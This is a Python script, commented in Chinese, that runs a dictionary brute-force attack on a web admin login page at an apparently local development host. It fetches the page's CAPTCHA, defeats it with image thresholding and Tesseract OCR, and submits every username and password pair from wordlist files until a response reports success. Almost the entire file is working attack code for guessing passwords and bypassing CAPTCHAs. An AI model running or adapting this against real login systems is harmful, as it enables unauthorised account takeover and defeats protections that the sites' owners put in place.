import pytesseract
from PIL import Image
import requests
import re
 
#python I:\work\project\python\get_pwd\get_pwd.py

s = requests.session()
url = 'http://amdev.local.com/index.php/admin/login/login.html'  # 登录页面url
headers  = {'User-Agent':'Mozilla/5.0'}

filesFolderPath="files/";
imgFolderPath="images/";
verifyImgName=imgFolderPath+"verify.png";
 
def getCode():                  # 获取验证码
     
    res = s.get('http://amdev.local.com/index.php/Admin/login/verify.html').content # 打开图片url返回图片二进制数据
    with open(verifyImgName,'wb') as v:
        v.write(res)        # 将二进制数据写入图片
    #供测试的图片地址：https://img-blog.csdn.net/20180621094823314?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5MjA4NTM2/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70
    # 重新打开生成的文件
    image = Image.open(verifyImgName)
    # 转灰色
    image = image.convert('L')
    # 二值化
    threshold = 1
    table = []
    for i in range(256):
        if i < threshold:
            table.append(0)
        else:
            table.append(1)
    image = image.point(table,'1')
    # 显示图片
    #image.show()
    # 识别图片文字
    code = pytesseract.image_to_string(image)
    #print(code.strip('\n'))
    return code.strip('\n')
 
def getResult(headers,data):            # 发送请求
    r = s.post(url,headers=headers,data=data)
 
    if re.search('success',r.text)!=None:
        print('找到正确密码：',data)
        return 1
    else:
        if re.search('验证码',r.text) != None:
            return 2
 
def putPass(user,pwd):          # 传递参数，发送请求
    code = getCode()  # 获取验证码
    print(code)
    data = {"user":user,"pwd":pwd,"code":code}
    print(data)
    result = getResult(headers,data)
    if result ==1:
        return 1
    elif result ==2:
        putPass(user,pwd)
    else:
        return 3
 
def getUserPass():      # 获取字典中的用户名密码
    # 打开账号文件
    userfile = open(filesFolderPath+'user.txt',mode='r')
    for user in userfile:
        user = user.strip('\n')     # 去掉换行符

        # 打开密码文件
        passfile = open(filesFolderPath+'pass.txt',mode='r')
        # 循环破解密码
 
        for pwd in passfile:
            pwd = pwd.strip('\n')
            print(user+pwd)
            flag = putPass(user,pwd)
 
        passfile.close()
    userfile.close()
	
print("------------开始执行------------")
getUserPass()
 